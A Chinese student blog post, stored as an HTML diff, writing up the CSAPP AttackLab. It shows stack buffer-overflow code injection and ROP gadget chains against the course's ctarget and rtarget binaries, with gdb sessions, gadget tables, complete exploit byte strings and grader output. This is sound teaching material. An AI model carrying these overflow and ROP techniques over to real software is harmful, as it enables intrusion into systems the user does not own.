@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>AttackLab - リン屋</title>
+
+  
+    <meta name="description" content="CSAPP ATTACKLAB 实验总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AttackLab">
+<meta property="og:url" content="https://github.com/RinChanNOWWW/attacklab/">
+<meta property="og:site_name" content="リン屋">
+<meta property="og:description" content="CSAPP ATTACKLAB 实验总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-12-08T05:51:01.000Z">
+<meta property="article:modified_time" content="2018-12-08T05:51:01.000Z">
+<meta property="article:author" content="RinChanNOW">
+<meta property="article:tag" content="实验报告">
+<meta name="twitter:card" content="summary">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://cdn.jsdelivr.net/gh/RinChanNOWWW/jsdelivrp-cdn@master/profile/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">リン屋</div><div class="sub cap">RinChanNOW's blog</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">博客</a><a class="nav-item" href="/about/">关于</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-I-Code-Injection-Attacks"><span class="toc-text">Part I: Code Injection Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1"><span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3"><span class="toc-text">Level 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-II-Return-Oriented-Programming"><span class="toc-text">Part II: Return-Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2-1"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3-1"><span class="toc-text">Level 3</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/blog/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/">课程学习</a></div><div id="post-meta">发布于&nbsp;<time datetime="2018-12-08T05:51:01.000Z">2018-12-08</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>AttackLab</span></h1>
+<p>CSAPP ATTACKLAB 实验总结</p>
+<span id="more"></span>
+
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ol>
+<li>macOS Mojave 10.14.1</li>
+<li>iTerm2 终端</li>
+</ol>
+<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>详见 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a></p>
+<h1 id="开始吧"><a href="#开始吧" class="headerlink" title="开始吧"></a>开始吧</h1><p>准备工作：</p>
+<ul>
+<li>登陆学校服务器</li>
+</ul>
+<p><code>ssh xxxxxxxxxx@10.120.11.13</code></p>
+<ul>
+<li>解压target</li>
+</ul>
+<p><code>tar -xvf target99.tar</code></p>
+<ul>
+<li>将实验所需要的两个程序<code>ctarget</code>和<code>rtarget</code>反汇编</li>
+</ul>
+<p><code>objdump -d ctarget &gt; dis</code><br><code>objdump -d rtarget &gt; dis2</code></p>
+<p>正式开始：</p>
+<h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>根据实验内容pdf文档可以知道，这项内容是让我通过一些操作触发<code>touch1</code>函数。文档中提供了<code>getbuf</code>函数、<code>test</code>函数和<code>touch1</code>函数的C语言代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;         <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);	</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以看出getbuf会从缓冲区读入数据存入buf数组中，而我就可以利用这个buf数组的大小限制对代码进行攻击，使得<code>getbuf</code>执行完后不返回到<code>test</code>，而是跳转到<code>touch1</code>从而达到目的。<br>接下来需要找到<code>BUFFER_SIZE</code>的大小。因此查看getbuf函数的反汇编代码：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401768</span> &lt;getbuf&gt;:</span><br><span class="line"><span class="number">401768</span>:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">40176c:       <span class="number">48</span> <span class="number">89</span> e7                <span class="keyword">mov</span>    %rsp,%rdi</span><br><span class="line">40176f:       e8 <span class="number">36</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  4019aa &lt;Gets&gt;</span><br><span class="line"><span class="number">401774</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"><span class="number">401779</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">40177d</span>:       c3                      retq</span><br><span class="line">40177e:       <span class="number">66</span> <span class="number">90</span>                   <span class="keyword">xchg</span>   %ax,%ax</span><br></pre></td></tr></table></figure>
+<p>看到一开始<code>%rsp</code>减少了0x18可以判断出，这个buffer的大小就是0x18个字节，即24个字节。也就是说，我需要将这24个字节填满，再注入一条<code>touch1</code>的返回地址即可将原返回地址覆盖，使得<code>getbuf</code>之后返回到<code>touch1</code>.</p>
+<p>查看<code>touch1</code>的反汇编代码可以得到它的地址为<code>0x401780</code>。<br>因为实验环境为<strong>小端机器</strong>，所以我们可以构造输入的攻击代码段为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">80 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>按照attacklab.pdf中介绍的方法我们对<code>ctarget</code>进行攻击:<br><code>./hex2raw &lt; phase1 | ./ctarget</code>    </p>
+<p>程序运行提示成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x286582b8</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>先来看touch2的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从这段代码看出来我需要为<code>touch2</code>设置一个参数val，它的值为target为我提供的cookie:<code>0x286582b8</code>，所以这次攻击与上一次唯一的区别就是我在返回到<code>touch2</code>之前必须要它的第一个参数设置为cookie的值。而函数的第一个参数都存在寄存器<code>%rdi</code>中，于是我需要构造一段代码将cookie的值存到<code>%rdi</code>中，并设置<code>%rsp</code>中新的返回地址为存储<code>touch2</code>地址的栈中地址：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x286582b8, %rdi</span><br><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x5567b418, %rsp</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+<p>将编译后反汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:   48 c7 c7 b8 82 65 28    mov    $0x286582b8,%rdi</span><br><span class="line">7:   48 c7 c4 18 b4 67 55    mov    $0x5567b418,%rsp</span><br><span class="line">e:   c3                      retq</span><br></pre></td></tr></table></figure>
+<p>可以得到这段指令的机器代码。而它就是我需要注入到程序中的攻击代码。另外我们需要将返回地址设置为到这段代码（指令）的地址，即<code>getbuf</code>函数执行后<code>%rsp</code>中存储的地址。运行gdb到<code>getbuf</code>分配内存后的指令，并查看<code>%rsp</code>中的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b getbuf</span><br><span class="line">Breakpoint 1 at 0x401768: file buf.c, line 12.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/students/2017211613/target99/ctarget</span><br><span class="line">sCookie: 0x286582b8</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12    buf.c: No such file or directory.</span><br><span class="line">(gdb) s</span><br><span class="line">14    in buf.c</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">0x0000000000401768 &lt;+0&gt;:    sub    $0x18,%rsp</span><br><span class="line">=&gt; 0x000000000040176c &lt;+4&gt;:    mov    %rsp,%rdi</span><br><span class="line">0x000000000040176f &lt;+7&gt;:    callq  0x4019aa &lt;Gets&gt;</span><br><span class="line">0x0000000000401774 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">0x0000000000401779 &lt;+17&gt;:    add    $0x18,%rsp</span><br><span class="line">0x000000000040177d &lt;+21&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) p/x $rsp</span><br><span class="line">$1 = 0x5567b408</span><br></pre></td></tr></table></figure>
+<p>可以得到此段栈帧的栈顶地址为<code>0x5567b408</code>，然后与之前一样得到<code>touch2</code>的地址：<code>0x4017ac</code><br>这样我就得到这次攻击的代码段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 82 65 28 48</span><br><span class="line">c7 c4 18 b4 67 55 c3 00</span><br><span class="line">ac 17 40 00 00 00 00 00</span><br><span class="line">08 b4 67 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>注入攻击：<code>./hex2raw &lt; phase2 | ./ctarget</code></p>
+<p>成功:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x286582b8</span><br><span class="line">Type string:Touch2!: You called touch2(0x286582b8)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>先来康康<code>touch3</code>的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出，这个和level2其实差不多，区别在于cookie在此需要以字符串的形式保存，而且传入<code>touch3</code>的参数是这段字符串的地址。按照和之前一样的步骤，先找到<code>touch3</code>的地址：<code>0x401880</code>，<code>getbuf</code>栈帧栈顶地址<code>0x5567b408</code>不变。cookie字符串所对应的16进制为：<code>32 38 36 35 38 32 62 38 00</code>（**因为是字符串所以最后有字符’\0’**）。因为buffsize有限，所以我将cookie存在更后面的位置。<br>与level2同理，写出一些需要改变寄存器值的操作：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x5567b428, %rdi</span><br><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x5567b410, %rsp</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+<p>将其编译后反汇编得到机器代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 08 b4 67 55    </span><br><span class="line">48 c7 c4 10 b4 67 55    </span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+<p>然后就得出了最后的攻击代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 28 b4 67 55 48</span><br><span class="line">c7 c4 18 b4 67 55 c3 00</span><br><span class="line">80 18 40 00 00 00 00 00</span><br><span class="line">08 b4 67 55 00 00 00 00</span><br><span class="line">32 38 36 35 38 32 62 38</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<p>注入攻击：<code>./hex2raw &lt; phase3 | ./ctarget</code><br>成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x286582b8</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;286582b8&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+
+<h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>老师上课讲了ROP的基本思想，因为栈的保护机制，我们无法像Part I中一样获取栈的地址，而且插入的代码也无法执行，但我们还可以通过程序中存在的一些函数，它们的机器代码通过截取一段可以构成新的不同意义的指令（带<code>ret</code>）。而这些指令就可以帮助我完成攻击。<br>通过查表并对应farm中的反汇编代码，我整理出来了一些可用的gadgets（都带有ret）：</p>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>对应指令</th>
+<th>指令的起始地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>setval_487</code></td>
+<td><code>movq %rax,%rdi</code></td>
+<td><code>0x401917</code></td>
+</tr>
+<tr>
+<td><code>setval_487</code></td>
+<td><code>movl %eax,%edi</code></td>
+<td><code>0x401918</code></td>
+</tr>
+<tr>
+<td><code>addval_207</code></td>
+<td><code>popq %rax</code></td>
+<td><code>0x401925</code></td>
+</tr>
+<tr>
+<td><code>setval_316</code></td>
+<td><code>popq %rax</code></td>
+<td><code>0x401941</code></td>
+</tr>
+<tr>
+<td><code>setval_153</code></td>
+<td><code>movl %esp,%eax</code></td>
+<td><code>0x40197f</code></td>
+</tr>
+<tr>
+<td><code>setval_181</code></td>
+<td><code>movl %ecx,%edx</code></td>
+<td><code>0x401994</code></td>
+</tr>
+<tr>
+<td><code>addval_103</code></td>
+<td><code>movq %rsp,%rax</code></td>
+<td><code>0x4019ae</code></td>
+</tr>
+<tr>
+<td><code>getval_178</code></td>
+<td><code>movl %eax,%ecx</code></td>
+<td><code>0x4019d5</code></td>
+</tr>
+<tr>
+<td><code>getval_308</code></td>
+<td><code>movl %edx,%esi</code></td>
+<td><code>0x4019f0</code></td>
+</tr>
+<tr>
+<td><code>add_xy</code></td>
+<td><code>lea (%rdi,%rsi,1),%rax</code></td>
+<td><code>0x40194a</code></td>
+</tr>
+<tr>
+<td>要触发<code>touch2</code>，我将栈构造如下（高地址到低地址，8字节一个单位）：</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">栈底</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">……</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;touch2</code></td>
+</tr>
+<tr>
+<td align="center"><code>movq %rax,%rdi</code><br><code>ret</code></td>
+</tr>
+<tr>
+<td align="center">cookie:<code>0x286582b8</code></td>
+</tr>
+<tr>
+<td align="center"><code>popq %rax</code><br><code>ret</code></td>
+</tr>
+<tr>
+<td align="center"><code>buf</code>的24个字节</td>
+</tr>
+<tr>
+<td align="center">栈顶</td>
+</tr>
+<tr>
+<td align="center">根据以上信息对照我列出的gadgets表可以构造出phase4代码：</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">41 19 40 00 00 00 00 00</span><br><span class="line">b8 82 65 28 00 00 00 00</span><br><span class="line">17 19 40 00 00 00 00 00</span><br><span class="line">ac 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>注入攻击：<code>./hex2raw &lt; phase4 | ./rtarget</code><br>成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x286582b8</span><br><span class="line">Type string:Touch2!: You called touch2(&quot;286582b8&quot;)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>最终目的和Part I中的level3一样，要将cookie所在字符串的地址传入<code>%rdi</code>并触发<code>touch3</code>。<br>我构造了这样一个步骤：</p>
+<table>
+<thead>
+<tr>
+<th align="center">栈底</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">……</td>
+</tr>
+<tr>
+<td align="center">cookie:<code>0x323836353832623800</code></td>
+</tr>
+<tr>
+<td align="center"><code>&amp;touch3</code></td>
+</tr>
+<tr>
+<td align="center"><code>movq %rax,%rdi</code></td>
+</tr>
+<tr>
+<td align="center"><code>lea (%rdi,%rsi,1),%rax</code></td>
+</tr>
+<tr>
+<td align="center"><code>movq %rax,%rdi</code></td>
+</tr>
+<tr>
+<td align="center"><code>movq %rsp,%rax</code></td>
+</tr>
+<tr>
+<td align="center"><code>movl %edx,%esi</code></td>
+</tr>
+<tr>
+<td align="center"><code>movl %ecx,%edx</code></td>
+</tr>
+<tr>
+<td align="center"><code>movl %eax,%ecx</code></td>
+</tr>
+<tr>
+<td align="center">bias:<code>0x20</code></td>
+</tr>
+<tr>
+<td align="center"><code>popq %rax</code><br><code>ret</code></td>
+</tr>
+<tr>
+<td align="center"><code>buf</code>的24个字节</td>
+</tr>
+<tr>
+<td align="center">栈顶</td>
+</tr>
+<tr>
+<td align="center">再对照我列的gadgets表写出攻击代码：</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">41 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">d5 19 40 00 00 00 00 00</span><br><span class="line">94 19 40 00 00 00 00 00</span><br><span class="line">f0 19 40 00 00 00 00 00</span><br><span class="line">ae 19 40 00 00 00 00 00</span><br><span class="line">17 19 40 00 00 00 00 00</span><br><span class="line">4a 19 40 00 00 00 00 00</span><br><span class="line">17 19 40 00 00 00 00 00</span><br><span class="line">80 18 40 00 00 00 00 00</span><br><span class="line">32 38 36 35 38 32 62 38</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<p>注入攻击：<code>./hex2raw &lt; phase5 | ./rtarget</code><br>成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x286582b8</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;286582b8&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<p><strong>本次实验结束</strong></p>
+<h1 id="总结体会"><a href="#总结体会" class="headerlink" title="总结体会"></a>总结体会</h1><p>这次的AttackLab相比于上次的BombLab更让我感觉pro了一点。这次的实验让我体验了一把黑客的感觉。虽然现在不可能有那么简单的漏洞能让我这么轻易的攻击。<br>这次主要是考察了我对函数调用以及栈的理解。在做最后一个攻击的时候我犯了一个很弱智的错误，那就是把地址放在32位寄存器里传递，浪费了我半个小时的睡眠时间。<br>在某些意义上这次实验比上一次实验还更为简单，只要掌握了对机器执行指令时栈以及相关寄存器的作用很容易就能完成本次实验。<font color=RED><strong>不过我们实验发的也太晚了吧，九点过才发，我开始做的时候其他一个班的大佬都已经做完了。而且我本来就做得慢，<del>晚上看动画片的时间都耽搁了</del>。</strong></font>不过还好在熄灯前把它弄完了。<br>这学期唯一有计算机专业感觉的课就只有这门课了，希望老师给我们带来更多有趣的知识。</p>
+
+
